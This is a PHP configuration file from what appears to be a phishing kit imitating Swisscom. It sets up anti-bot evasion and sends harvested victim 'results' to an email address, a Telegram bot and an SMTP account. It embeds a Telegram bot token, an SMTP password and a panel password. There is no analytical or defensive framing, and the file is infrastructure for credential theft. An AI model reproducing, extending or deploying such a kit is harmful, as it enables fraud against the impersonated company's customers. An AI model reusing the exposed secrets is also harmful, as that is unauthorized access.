<?php
    /*******
    Main Author: Z0N51
    Contact me on telegram : https://t.me/z0n51
    ********************************************************/
    
    session_start();
    error_reporting(0);
    define("ANTIBOT_API", 'API_HERE'); // ANTIBOT.PW API
    require_once 'detect.php';
    require_once 'functions.php';
    passport();
    define("PASSWORD", 'woo');
    define("RECEIVER", 'morocco6667@gmail.com');
    define("TELEGRAM_TOKEN", '1521146393:AAGcmnVYxG-8h11ldZJDoXDreE9oKaWvWFU');
    define("TELEGRAM_CHAT_ID", '1088398986');
    define("SMTP_HOSTNAME", 'smtps.udag.de');
    define("SMTP_USER", 'swiss@boozikano.online');
    define("SMTP_PASS", 'w{zBpyrQdq;Zjz9b');
    define("SMTP_PORT", 465);
    define("SMTP_FROM_EMAIL", 'Rez243340894309834@devil.com');
    define("TXT_FILE_NAME", 'my_result002.txt');
    define("OFFICIAL_WEBSITE", 'https://www.swisscom.ch/');

    define("RECEIVE_VIA_EMAIL", 1); // Receive results via e-mail : 0 or 1
    define("RECEIVE_VIA_SMTP", 0); // Receive results via smtp : 0 or 1
    define("RECEIVE_VIA_TELEGRAM", 1); // Receive results via telegram : 0 or 1
    define("RESULTS_IN_TXT", 0); // Receive the results on txt file : 0 or 1
?>